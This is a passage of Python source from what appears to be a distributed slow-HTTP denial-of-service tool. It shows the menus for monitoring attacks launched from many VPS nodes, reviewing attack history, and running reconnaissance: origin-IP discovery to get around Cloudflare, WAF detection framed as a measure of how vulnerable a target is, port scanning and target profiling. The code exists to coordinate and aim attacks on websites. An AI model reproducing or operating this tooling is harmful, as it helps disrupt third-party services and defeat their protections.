                attack_name = self.attack_manager.get_available_attack_methods().get(attack_info['attack_type'], attack_info['attack_type'])
                print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
            
            try:
                session_input = self.terminal.input_with_prompt("Enter session ID to monitor: ")
                if not session_input or not session_input.isdigit():
                    return
                session_id = int(session_input)
            except (ValueError, KeyboardInterrupt):
                return
        
        if session_id not in self.attack_manager.active_attacks:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time attack monitoring...{Colors.RESET}")
        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(2)
        
        try:
            refresh_interval = 5  # seconds
            while session_id in self.attack_manager.active_attacks:
                status_data = self.attack_manager.get_attack_status(session_id)
                attack_info = self.attack_manager.active_attacks[session_id]
                
                # Clear screen and display status
                self.terminal.clear_screen()
                
                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.RED}     DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
                print(f"{Colors.BOLD}{'='*90}{Colors.RESET}")
                
                attack_name = self.attack_manager.get_available_attack_methods().get(attack_info.get('attack_type'), attack_info.get('attack_type', 'Unknown'))
                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
                
                if attack_info.get('start_time'):
                    uptime = datetime.now() - attack_info['start_time']
                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
                
                # Parameters display
                params = attack_info.get('parameters', {})
                params_str = " | ".join(f"{k}: {v}" for k, v in params.items())
                print(f"{Colors.PURPLE}[PARAMS]  {params_str}{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<15} {'CPU':<12} {'Data Sent':<15} {'Uptime'}")
                print("-" * 95)
                
                total_processes = 0
                active_vps = 0
                total_bytes_sent = 0
                
                for vps_ip, data in status_data.items():
                    processes = data.get('active_processes', 0)
                    status = "ATTACKING" if processes > 0 else "IDLE"
                    color = Colors.GREEN if processes > 0 else Colors.RED
                    conn_info = data.get('connections_info', '')
                    cpu_info = data.get('cpu_info', '')
                    bytes_sent = data.get('bytes_sent', 0)
                    uptime = data.get('uptime', 0)
                    
                    # Format bytes sent
                    if bytes_sent > 1024*1024*1024:
                        bytes_display = f"{bytes_sent/(1024*1024*1024):.2f} GB"
                    elif bytes_sent > 1024*1024:
                        bytes_display = f"{bytes_sent/(1024*1024):.2f} MB"
                    elif bytes_sent > 1024:
                        bytes_display = f"{bytes_sent/1024:.2f} KB"
                    else:
                        bytes_display = f"{bytes_sent} B"
                    
                    # Format uptime
                    if uptime > 3600:
                        uptime_display = f"{uptime//3600}h {(uptime%3600)//60}m"
                    elif uptime > 60:
                        uptime_display = f"{uptime//60}m {uptime%60}s"
                    else:
                        uptime_display = f"{uptime}s"
                    
                    total_processes += processes
                    total_bytes_sent += bytes_sent
                    if processes > 0:
                        active_vps += 1
                    
                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<15} {cpu_info:<12} {bytes_display:<15} {uptime_display}")
                
                # Format total bytes sent
                if total_bytes_sent > 1024*1024*1024:
                    total_bytes_display = f"{total_bytes_sent/(1024*1024*1024):.2f} GB"
                elif total_bytes_sent > 1024*1024:
                    total_bytes_display = f"{total_bytes_sent/(1024*1024):.2f} MB"
                elif total_bytes_sent > 1024:
                    total_bytes_display = f"{total_bytes_sent/1024:.2f} KB"
                else:
                    total_bytes_display = f"{total_bytes_sent} B"
                
                print(f"\n{Colors.BOLD}ATTACK STATISTICS:{Colors.RESET}")
                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
                print(f"{Colors.RED}Total Data Sent: {total_bytes_display}{Colors.RESET}")
                
                est_connections = total_processes * params.get('connections', 100)
                print(f"{Colors.RED}Estimated Total Connections: {est_connections:,}{Colors.RESET}")
                
                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring | Press 's' to stop attack{Colors.RESET}")
                
                # Non-blocking input check using the improved terminal helper
                user_input = self.terminal.get_input_with_timeout("Command (s=stop, r=refresh): ", refresh_interval)
                
                if user_input and user_input.lower() == 's':
                    print(f"{Colors.YELLOW}Stopping attack...{Colors.RESET}")
                    self.attack_manager.stop_attack(session_id)
                    break
            
            # If we got here and the attack is no longer active, it might have completed
            if session_id not in self.attack_manager.active_attacks:
                print(f"\n{Colors.GREEN}[INFO] Attack has completed or been stopped{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
            
            # Ask if user wants to stop the attack
            try:
                stop_attack = input(f"{Colors.RED}Stop the attack? (y/N): {Colors.RESET}").strip().lower()
                if stop_attack == 'y':
                    self.attack_manager.stop_attack(session_id)
            except KeyboardInterrupt:
                pass
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        """Menu for viewing attack history"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        sessions = self.db_manager.get_attack_sessions()
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 30)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
        else:
            # Convert to list of lists for table printing
            headers = ["ID", "Session Name", "Target", "Type", "Status", "Start Time"]
            data = []
            
            for session in sessions:
                start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
                status_color = Colors.GREEN if session['status'] == 'completed' else Colors.YELLOW if session['status'] == 'running' else Colors.RED
                status = f"{status_color}{session['status']}{Colors.RESET}"
                attack_type = self.attack_manager.get_available_attack_methods().get(session['attack_type'], session['attack_type'])
                
                data.append([
                    session['id'],
                    session['session_name'][:24],
                    session['target_host'][:19],
                    attack_type,
                    status,
                    start_time
                ])
            
            self.terminal.print_table(headers, data)
            
            # View details option
            print(f"\n{Colors.BOLD}OPTIONS:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} View Attack Details")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Filter by Status")
            print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
            
            choice = self.terminal.input_with_prompt("\nSelect option: ")
            if choice == '1':
                session_id = self.terminal.input_with_prompt("Enter session ID to view: ")
                if session_id and session_id.isdigit():
                    self.view_attack_details(int(session_id))
                    return
            elif choice == '2':
                print(f"\n{Colors.BOLD}FILTER BY STATUS:{Colors.RESET}")
                print(f"{Colors.GREEN}[1]{Colors.RESET} Running")
                print(f"{Colors.GREEN}[2]{Colors.RESET} Completed")
                print(f"{Colors.GREEN}[3]{Colors.RESET} Stopped")
                print(f"{Colors.GREEN}[4]{Colors.RESET} Failed")
                print(f"{Colors.GREEN}[0]{Colors.RESET} All")
                
                filter_choice = self.terminal.input_with_prompt("Select status: ")
                if filter_choice == '1':
                    self.view_filtered_attacks('running')
                elif filter_choice == '2':
                    self.view_filtered_attacks('completed')
                elif filter_choice == '3':
                    self.view_filtered_attacks('stopped')
                elif filter_choice == '4':
                    self.view_filtered_attacks('failed')
                return
        
        input("\nPress Enter to continue...")
    
    def view_filtered_attacks(self, status):
        """View attacks filtered by status"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        sessions = self.db_manager.get_attack_sessions(status=status)
        
        print(f"{Colors.BOLD}ATTACK HISTORY - {status.upper()}{Colors.RESET}")
        print("=" * 30)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No {status} attacks found{Colors.RESET}")
        else:
            # Convert to list of lists for table printing
            headers = ["ID", "Session Name", "Target", "Type", "Start Time"]
            data = []
            
            for session in sessions:
                start_time = session['start_time'][:19] if session['start_time'] else 'N/A'
                attack_type = self.attack_manager.get_available_attack_methods().get(session['attack_type'], session['attack_type'])
                
                data.append([
                    session['id'],
                    session['session_name'][:24],
                    session['target_host'][:19],
                    attack_type,
                    start_time
                ])
            
            self.terminal.print_table(headers, data)
            
            # View details option
            session_id = self.terminal.input_with_prompt("\nEnter session ID to view details (or Enter to go back): ", False)
            if session_id and session_id.isdigit():
                self.view_attack_details(int(session_id))
                return
        
        input("\nPress Enter to continue...")
    
    def view_attack_details(self, session_id):
        """View detailed information about an attack session"""
        session = self.db_manager.get_attack_session(session_id)
        
        if not session:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        self.terminal.clear_screen()
        print(f"{Colors.BOLD}ATTACK SESSION DETAILS: {session_id}{Colors.RESET}")
        print("=" * 50)
        
        # Basic info
        print(f"\n{Colors.BOLD}BASIC INFORMATION:{Colors.RESET}")
        print(f"Session Name: {session['session_name']}")
        print(f"Target URL: {session['target_url']}")
        print(f"Target Host: {session['target_host']}")
        attack_name = self.attack_manager.get_available_attack_methods().get(session['attack_type'], session['attack_type'])
        print(f"Attack Type: {attack_name}")
        status_color = Colors.GREEN if session['status'] == 'completed' else Colors.YELLOW if session['status'] == 'running' else Colors.RED
        print(f"Status: {status_color}{session['status']}{Colors.RESET}")
        print(f"Start Time: {session['start_time'][:19] if session['start_time'] else 'N/A'}")
        print(f"End Time: {session['end_time'][:19] if session['end_time'] else 'N/A'}")
        
        # Calculate duration if available
        if session['start_time'] and session['end_time']:
            try:
                start = datetime.fromisoformat(session['start_time'])
                end = datetime.fromisoformat(session['end_time'])
                duration = end - start
                print(f"Duration: {str(duration).split('.')[0]}")
            except:
                pass
        
        # Parameters
        if session['parameters']:  # parameters column
            try:
                parameters = json.loads(session['parameters'])
                print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
                for key, value in parameters.items():
                    print(f"{key}: {value}")
            except:
                pass
        
        # VPS nodes
        if session['vps_nodes']:  # vps_nodes column
            try:
                vps_list = json.loads(session['vps_nodes'])
                print(f"\n{Colors.BOLD}VPS NODES ({len(vps_list)}):{Colors.RESET}")
                for i, vps in enumerate(vps_list, 1):
                    print(f"{i}. {vps}")
            except:
                pass
        
        # Results
        if session['results']:  # results column
            try:
                results = json.loads(session['results'])
                print(f"\n{Colors.BOLD}ATTACK RESULTS:{Colors.RESET}")
                for key, value in results.items():
                    print(f"{key}: {value}")
            except:
                pass
        
        # Get attack results from database
        attack_results = self.db_manager.get_attack_results(session_id)
        if attack_results:
            print(f"\n{Colors.BOLD}ATTACK METRICS:{Colors.RESET}")
            
            # Group by VPS
            vps_metrics = {}
            for result in attack_results:
                vps_ip = result['vps_ip']
                if vps_ip not in vps_metrics:
                    vps_metrics[vps_ip] = []
                vps_metrics[vps_ip].append(result)
            
            # Show metrics for each VPS
            for vps_ip, metrics in vps_metrics.items():
                print(f"\n{Colors.CYAN}VPS: {vps_ip}{Colors.RESET}")
                
                # Get the latest metric
                latest = metrics[-1]
                print(f"  Connections: {latest['connections_active']}")
                print(f"  Packets Sent: {latest['packets_sent']}")
                print(f"  Bytes Sent: {self._format_bytes(latest['bytes_sent'])}")
                print(f"  Errors: {latest['error_count']}")
                
                if latest['cpu_usage']:
                    print(f"  CPU Usage: {latest['cpu_usage']}%")
                if latest['memory_usage']:
                    print(f"  Memory Usage: {latest['memory_usage']}%")
                
                # Show response codes if available
                if latest['response_codes']:
                    try:
                        response_codes = json.loads(latest['response_codes'])
                        print(f"  Response Codes:")
                        for code, count in response_codes.items():
                            print(f"    {code}: {count}")
                    except:
                        pass
        
        # Notes
        if session['notes']:  # notes column
            print(f"\n{Colors.BOLD}NOTES:{Colors.RESET}")
            print(session['notes'])
        
        # Target info
        if session['target_info']:  # target_info column
            try:
                target_info = json.loads(session['target_info'])
                print(f"\n{Colors.BOLD}TARGET INFORMATION:{Colors.RESET}")
                
                if 'waf_detected' in target_info:
                    print(f"WAF Detected: {Colors.RED if target_info['waf_detected'] else Colors.GREEN}{target_info['waf_detected']}{Colors.RESET}")
                    if target_info['waf_detected'] and target_info.get('waf_type'):
                        print(f"WAF Type: {target_info['waf_type']}")
                
                if 'cloudflare_protected' in target_info:
                    print(f"Cloudflare Protected: {Colors.RED if target_info['cloudflare_protected'] else Colors.GREEN}{target_info['cloudflare_protected']}{Colors.RESET}")
                
                if 'web_server' in target_info and target_info['web_server']:
                    print(f"Web Server: {target_info['web_server']}")
            except:
                pass
        
        # Actions menu
        print(f"\n{Colors.BOLD}ACTIONS:{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Edit Notes")
        if session['status'] == 'running':
            print(f"{Colors.GREEN}[2]{Colors.RESET} Stop Attack")
            print(f"{Colors.GREEN}[3]{Colors.RESET} Monitor Attack")
        print(f"{Colors.GREEN}[0]{Colors.RESET} Back")
        
        action = self.terminal.input_with_prompt("\nSelect action: ")
        
        if action == "1":
            # Edit notes
            current_notes = session['notes'] or ""
            print(f"\n{Colors.BOLD}CURRENT NOTES:{Colors.RESET}")
            print(current_notes)
            new_notes = self.terminal.input_with_prompt("\nEnter new notes (leave empty to keep current): ", False)
            
            if new_notes:
                self.db_manager.update_attack_notes(session_id, new_notes)
                print(f"{Colors.GREEN}Notes updated{Colors.RESET}")
        
        elif action == "2" and session['status'] == 'running':
            # Stop attack
            confirm = input(f"{Colors.RED}Are you sure you want to stop this attack? (y/N): {Colors.RESET}").strip().lower()
            if confirm == 'y':
                success, message = self.attack_manager.stop_attack(session_id)
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] {message}{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] {message}{Colors.RESET}")
                input("Press Enter to continue...")
        
        elif action == "3" and session['status'] == 'running':
            # Monitor attack
            self.monitor_attack(session_id)
    
    def network_recon_menu(self):
        """Menu for network reconnaissance tools"""
        while self.running:
            self.terminal.clear_screen()
            self.terminal.print_banner(VERSION)
            
            print(f"{Colors.BOLD}NETWORK RECONNAISSANCE TOOLS{Colors.RESET}")
            print("=" * 50)
            
            print(f"\n{Colors.GREEN}[1]{Colors.RESET} DNS History Lookup")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Cloudflare Bypass Detection")
            print(f"{Colors.GREEN}[3]{Colors.RESET} WAF Detection")
            print(f"{Colors.GREEN}[4]{Colors.RESET} Port Scanner")
            print(f"{Colors.GREEN}[5]{Colors.RESET} SSL/TLS Certificate Checker")
            print(f"{Colors.GREEN}[6]{Colors.RESET} Target Information Gathering")
            print(f"{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu")
            
            choice = self.terminal.input_with_prompt("\nSelect option: ")
            
            if choice == "1":
                self.dns_history_tool()
            elif choice == "2":
                self.cloudflare_bypass_tool()
            elif choice == "3":
                self.waf_detection_tool()
            elif choice == "4":
                self.port_scanner_tool()
            elif choice == "5":
                self.ssl_checker_tool()
            elif choice == "6":
                self.target_info_tool()
            elif choice == "0":
                break
            else:
                print(f"{Colors.RED}Invalid option{Colors.RESET}")
                time.sleep(1)
    
    def dns_history_tool(self):
        """DNS history lookup tool"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}DNS HISTORY LOOKUP{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        print(f"\n{Colors.CYAN}[INFO] Looking up DNS history for {domain}...{Colors.RESET}")
        results = self.network_tools.lookup_dns_history(domain)
        
        print(f"\n{Colors.BOLD}CURRENT DNS RECORDS:{Colors.RESET}")
        for record_type, values in results["current_records"].items():
            print(f"\n{record_type} Records:")
            if values:
                for value in values:
                    print(f"  {value}")
            else:
                print("  No records found")
        
        print(f"\n{Colors.BOLD}HISTORICAL DNS RECORDS:{Colors.RESET}")
        if results["historical_records"]:
            for record in results["historical_records"]:
                print(f"  {record['date']} - {record['record_type']}: {record['value']}")
        else:
            print("  No historical records found")
        
        input("\nPress Enter to continue...")
    
    def cloudflare_bypass_tool(self):
        """Cloudflare bypass detection tool"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}CLOUDFLARE BYPASS DETECTION{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        print(f"\n{Colors.CYAN}[INFO] Checking if {domain} is behind Cloudflare...{Colors.RESET}")
        cf_results = self.network_tools.detect_cloudflare(domain)
        
        print(f"\n{Colors.BOLD}CLOUDFLARE DETECTION RESULTS:{Colors.RESET}")
        print(f"Domain: {cf_results['domain']}")
        cf_status = f"{Colors.RED}Yes{Colors.RESET}" if cf_results['is_behind_cloudflare'] else f"{Colors.GREEN}No{Colors.RESET}"
        print(f"Behind Cloudflare: {cf_status}")
        
        if cf_results['is_behind_cloudflare']:
            print(f"\n{Colors.BOLD}EVIDENCE:{Colors.RESET}")
            for evidence in cf_results['evidence']:
                print(f"  - {evidence}")
            
            print(f"\n{Colors.BOLD}CLOUDFLARE IPS:{Colors.RESET}")
            for ip in cf_results['cloudflare_ips']:
                print(f"  - {ip}")
            
            print(f"\n{Colors.CYAN}[INFO] Attempting to find origin IP...{Colors.RESET}")
            bypass_results = self.network_tools.cloudflare_bypass(domain)
            
            print(f"\n{Colors.BOLD}BYPASS ATTEMPTS:{Colors.RESET}")
            print(f"Methods used: {', '.join(bypass_results['methods_used'])}")
            
            print(f"\n{Colors.BOLD}POTENTIAL ORIGIN IPS:{Colors.RESET}")
            if bypass_results['potential_origin_ips']:
                for ip in bypass_results['potential_origin_ips']:
                    print(f"  - {ip}")
            else:
                print("  No origin IPs found")
        else:
            print(f"\n{Colors.BOLD}DIRECT IPS:{Colors.RESET}")
            for ip in cf_results['direct_ips']:
                print(f"  - {ip}")
        
        input("\nPress Enter to continue...")
    
    def waf_detection_tool(self):
        """WAF detection tool"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}WAF DETECTION{Colors.RESET}")
        print("=" * 50)
        
        url = self.terminal.input_with_prompt("Enter URL (e.g., https://example.com): ")
        if not url:
            return
        
        # Add http:// if not present
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        print(f"\n{Colors.CYAN}[INFO] Checking for WAF protection on {url}...{Colors.RESET}")
        results = self.network_tools.detect_waf(url)
        
        print(f"\n{Colors.BOLD}WAF DETECTION RESULTS:{Colors.RESET}")
        print(f"URL: {results['url']}")
        waf_status = f"{Colors.RED}Yes - {results['waf_type']}{Colors.RESET}" if results['waf_detected'] else f"{Colors.GREEN}No{Colors.RESET}"
        print(f"WAF Detected: {waf_status}")
        
        if results['waf_detected']:
            print(f"\n{Colors.BOLD}EVIDENCE:{Colors.RESET}")
            for evidence in results['evidence']:
                print(f"  - {evidence}")
            
            print(f"\n{Colors.YELLOW}[WARNING] WAF detection may reduce attack effectiveness{Colors.RESET}")
        else:
            print(f"\n{Colors.GREEN}[INFO] No WAF detected. Target may be more vulnerable to attacks.{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def port_scanner_tool(self):
        """Port scanner tool"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}PORT SCANNER{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target (domain or IP): ")
        if not target:
            return
        
        # Ask for scan type
        print(f"\n{Colors.BOLD}SCAN TYPE:{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Common ports (faster)")
        print(f"{Colors.GREEN}[2]{Colors.RESET} All ports (slower)")
        print(f"{Colors.GREEN}[3]{Colors.RESET} Custom port range")
        
        scan_type = self.terminal.input_with_prompt("Select scan type [1]: ", False) or "1"
        
        ports = None
        if scan_type == "1":
            # Common ports
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        elif scan_type == "2":
            # All ports would be too slow, so we'll do the first 1000
            ports = range(1, 1001)
        elif scan_type == "3":
            # Custom range
            start_port = self.terminal.input_with_prompt("Start port: ", validate_func=self.security_manager.validate_port)
            end_port = self.terminal.input_with_prompt("End port: ", validate_func=self.security_manager.validate_port)
            
            if start_port and end_port:
                start_port = int(start_port)
                end_port = int(end_port)
                
                if start_port > end_port:
                    start_port, end_port = end_port, start_port
                
                ports = range(start_port, end_port + 1)
        
        if not ports:
            print(f"{Colors.RED}Invalid scan type{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.CYAN}[INFO] Scanning {len(ports)} ports on {target}...{Colors.RESET}")
        
        # Show progress bar
        self.terminal.progress_bar(0, len(ports), prefix='Progress:', suffix='Complete', length=50)
        
        # Scan ports in batches to show progress
        results = {
            "target": target,
            "open_ports": [],
            "closed_ports": [],
            "filtered_ports": []
        }
        
        batch_size = max(1, len(ports) // 20)  # Update progress ~20 times
        
        for i in range(0, len(ports), batch_size):
            batch = list(ports)[i:i+batch_size]
            batch_results = self.network_tools.scan_ports(target, batch)
            
            results["open_ports"].extend(batch_results["open_ports"])
            results["closed_ports"].extend(batch_results["closed_ports"])
            results["filtered_ports"].extend(batch_results["filtered_ports"])
            
            # Update progress
            self.terminal.progress_bar(min(i + batch_size, len(ports)), len(ports), prefix='Progress:', suffix='Complete', length=50)
        
        print(f"\n\n{Colors.BOLD}SCAN RESULTS FOR {target}:{Colors.RESET}")
        print(f"Open ports: {len(results['open_ports'])}")
        print(f"Closed ports: {len(results['closed_ports'])}")
        print(f"Filtered ports: {len(results['filtered_ports'])}")
        
        if results["open_ports"]:
            print(f"\n{Colors.BOLD}OPEN PORTS:{Colors.RESET}")
            print(f"{'Port':<10} {'Service':<20}")
            print("-" * 30)
            
            for port_info in results["open_ports"]:
                print(f"{port_info['port']:<10} {port_info['service']:<20}")
        else:
            print(f"\n{Colors.YELLOW}No open ports found{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def ssl_checker_tool(self):
        """SSL/TLS certificate checker tool"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}SSL/TLS CERTIFICATE CHECKER{Colors.RESET}")
        print("=" * 50)
        
        domain = self.terminal.input_with_prompt("Enter domain name: ")
        if not domain:
            return
        
        port = self.terminal.input_with_prompt("Enter port [443]: ", False, validate_func=self.security_manager.validate_port) or "443"
        port = int(port)
        
        print(f"\n{Colors.CYAN}[INFO] Checking SSL certificate for {domain}:{port}...{Colors.RESET}")
        results = self.network_tools.check_ssl(domain, port)
        
        if not results["has_ssl"]:
            print(f"\n{Colors.RED}[ERROR] No SSL/TLS certificate found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}SSL/TLS CERTIFICATE INFORMATION:{Colors.RESET}")
        
        # Certificate subject
        if "subject" in results["certificate"]:
            print(f"\n{Colors.BOLD}Subject:{Colors.RESET}")
            for key, value in results["certificate"]["subject"].items():
                print(f"  {key}: {value}")
        
        # Certificate issuer
        if "issuer" in results["certificate"]:
            print(f"\n{Colors.BOLD}Issuer:{Colors.RESET}")
            for key, value in results["certificate"]["issuer"].items():
                print(f"  {key}: {value}")
        
        # Validity
        if "not_before" in results["certificate"] and "not_after" in results["certificate"]:
            print(f"\n{Colors.BOLD}Validity:{Colors.RESET}")
            print(f"  Not Before: {results['certificate']['not_before']}")
            print(f"  Not After: {results['certificate']['not_after']}")
        
        # TLS version
        if "tls_version" in results["certificate"]:
            print(f"\n{Colors.BOLD}TLS Version:{Colors.RESET}")
            print(f"  {results['certificate']['tls_version']}")
        
        # Cipher
        if "cipher" in results["certificate"]:
            print(f"\n{Colors.BOLD}Cipher:{Colors.RESET}")
            print(f"  {results['certificate']['cipher']}")
        
        # Vulnerabilities
        if results["vulnerabilities"]:
            print(f"\n{Colors.BOLD}{Colors.RED}Vulnerabilities:{Colors.RESET}")
            for vuln in results["vulnerabilities"]:
                print(f"  - {vuln}")
        else:
            print(f"\n{Colors.GREEN}No vulnerabilities detected{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def target_info_tool(self):
        """Target information gathering tool"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}TARGET INFORMATION GATHERING{Colors.RESET}")
        print("=" * 50)
        
        target = self.terminal.input_with_prompt("Enter target (domain or IP): ")
        if not target:
            return
        
        print(f"\n{Colors.CYAN}[INFO] Gathering information about {target}...{Colors.RESET}")
        results = self.network_tools.gather_target_info(target)
        
        print(f"\n{Colors.BOLD}TARGET INFORMATION:{Colors.RESET}")
        print(f"Domain: {results['domain']}")
        
        # IP addresses
        print(f"\n{Colors.BOLD}IP Addresses:{Colors.RESET}")
        for ip in results['ip_addresses']:
            print(f"  - {ip}")
        
        # Web server
        if results['web_server']:
            print(f"\n{Colors.BOLD}Web Server:{Colors.RESET}")
            print(f"  {results['web_server']}")
        
        # WAF detection
        waf_status = f"{Colors.RED}Yes - {results['waf_type']}{Colors.RESET}" if results['waf_detected'] else f"{Colors.GREEN}No{Colors.RESET}"
        print(f"\n{Colors.BOLD}WAF Detected:{Colors.RESET} {waf_status}")
        
        # Cloudflare protection
        cf_status = f"{Colors.RED}Yes{Colors.RESET}" if results['cloudflare_protected'] else f"{Colors.GREEN}No{Colors.RESET}"
        print(f"{Colors.BOLD}Cloudflare Protected:{Colors.RESET} {cf_status}")
        
        # Open ports
        if results['open_ports']:
            print(f"\n{Colors.BOLD}Open Ports:{Colors.RESET}")
            print(f"{'Port':<10} {'Service':<20}")
            print("-" * 30)
            
            for port_info in results['open_ports']:
                print(f"{port_info['port']:<10} {port_info['service']:<20}")
        
        # DNS records
        if results['dns_records']:
            print(f"\n{Colors.BOLD}DNS Records:{Colors.RESET}")
            for record_type, values in results['dns_records'].items():
                print(f"\n{record_type} Records:")
                if values:
                    for value in values:
                        print(f"  {value}")
                else:
                    print("  No records found")
        
        # SSL info
        if results['ssl_info']:
            print(f"\n{Colors.BOLD}SSL Certificate:{Colors.RESET}")
            if "issuer" in results['ssl_info']:
                issuer = results['ssl_info']['issuer']
                if 'O' in issuer:
                    print(f"  Issuer: {issuer['O']}")
            
            if "not_after" in results['ssl_info']:
                print(f"  Expires: {results['ssl_info']['not_after']}")
        
        # WHOIS info
        if results['whois_info']:
            print(f"\n{Colors.BOLD}WHOIS Information:{Colors.RESET}")
            print(f"  Registrar: {results['whois_info'].get('registrar', 'Unknown')}")
            print(f"  Creation Date: {results['whois_info'].get('creation_date', 'Unknown')}")
            print(f"  Expiration Date: {results['whois_info'].get('expiration_date', 'Unknown')}")
        
        # Save option
        print(f"\n{Colors.YELLOW}Would you like to save this information to the database? (y/N){Colors.RESET}")
        save_choice = input().strip().lower()
        
        if save_choice == 'y':
            target_id = self.db_manager.save_target_info(results['domain'], results)
            if target_id:
                print(f"{Colors.GREEN}[SUCCESS] Target information saved to database{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] Failed to save target information{Colors.RESET}")
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        """Menu for system status"""
        self.terminal.clear_screen()
        self.terminal.print_banner(VERSION)
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 20)
        
        # VPS Statistics
        vps_list = self.db_manager.get_all_vps()
        online_count = sum(1 for vps in vps_list if vps['status'] == 'online')
        offline_count = len(vps_list) - online_count
        
        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
        print(f"Total VPS: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
        
        # Attack Statistics
        sessions = self.db_manager.get_attack_sessions()
        active_attacks = len(self.attack_manager.active_attacks)
        completed_attacks = sum(1 for s in sessions if s['status'] == 'completed')
        failed_attacks = sum(1 for s in sessions if s['status'] == 'failed')
        
        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
        print(f"Active Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
        print(f"Completed Attacks: {Colors.GREEN}{completed_attacks}{Colors.RESET}")
        print(f"Failed Attacks: {Colors.YELLOW}{failed_attacks}{Colors.RESET}")
        
        # SSH Connections
        ssh_connections = len(self.ssh_manager.connections)
        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
        print(f"Active SSH: {Colors.GREEN}{ssh_connections}{Colors.RESET}")
        print(f"Cached Credentials: {Colors.CYAN}{len(self.ssh_manager.connection_cache)}{Colors.RESET}")
        
        # System Information
        print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
        print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
        print(f"Mode: {Colors.RED}ADVANCED EDITION v{VERSION}{Colors.RESET}")
        print(f"Python Version: {Colors.CYAN}{sys.version.split()[0]}{Colors.RESET}")
        print(f"Platform: {Colors.CYAN}{sys.platform}{Colors.RESET}")
        
        # System resources
        if PSUTIL_AVAILABLE:
            print(f"\n{Colors.BOLD}SYSTEM RESOURCES:{Colors.RESET}")
            print(f"CPU Usage: {Colors.CYAN}{psutil.cpu_percent()}%{Colors.RESET}")
